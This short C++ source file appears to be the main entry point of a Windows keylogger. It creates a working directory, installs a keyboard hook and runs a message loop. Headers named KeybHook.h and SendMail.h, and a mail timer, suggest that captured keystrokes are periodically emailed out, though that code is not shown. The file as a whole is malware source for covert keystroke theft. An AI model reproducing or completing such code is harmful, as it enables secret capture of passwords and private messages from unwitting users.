#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "KeyConst.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"
using namespace std;

int main ()
{
    MSG Msg;
    IO::MKDir(IO::GetOurPath(true));
    InstallHook();
    while(GetMessage (&Msg, NULL, 0, 0))
    {
        TranslateMessage(&Msg);
        DispatchMessageA(&Msg);
    }
    MailTimer.Stop();
    return 0;
}
